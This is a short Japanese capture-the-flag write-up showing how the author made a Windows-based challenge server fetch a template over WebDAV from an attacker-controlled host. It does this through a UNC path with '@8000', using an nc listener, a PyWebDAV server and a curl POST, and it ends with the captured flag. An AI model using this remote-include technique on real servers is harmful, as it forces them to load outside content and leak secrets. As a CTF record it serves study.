なんとかならないか UNC パスについてググってみると、どうやら[ホスト名の後に `@ポート番号` を続けると、WebDAV でのアクセスにできる](https://en.wikipedia.org/wiki/Path_(computing)#Universal_Naming_Convention)ことがわかりました。やってみましょう。

`\\(IP アドレス)@8000\TMP\test.html` を参照させると以下のようなアクセスが来ました。

```
$ nc -lvp 8000
Listening on [0.0.0.0] (family 0, port 8000)
Connection from (省略) 52415 received!
OPTIONS /TMP/test.html HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
translate: f
Host: (省略):8000
```

アクセスが来ました! [適当なツール](https://github.com/andrewleech/PyWebDAV3)を使って WebDAV サーバを立てましょう。

```
$ cat TMP/test.html 
{% raw %}{{> FLAG}}{% endraw %}
$ davserver -D ./ -n --host='0.0.0.0' --port=8000
```

`\\(IP アドレス)@8000\TMP\test.html` を参照させるとフラグが得られました。

```
$ curl -X POST http://(省略)/61050c6ef9c64583e828ed565ca424b8be3c585d90a77e52a770540eb6d2a020 -d 'hcda7a4f9=%5C%5C(省略)@8000%5CTMP%5Ctest.html' -H "d28c3a2a7: a" -b "i77baba57=b
Defenit{AuduLt_JS-@_lo7e5_@-b4By-JS__##}
```

```
Defenit{AuduLt_JS-@_lo7e5_@-b4By-JS__##}
```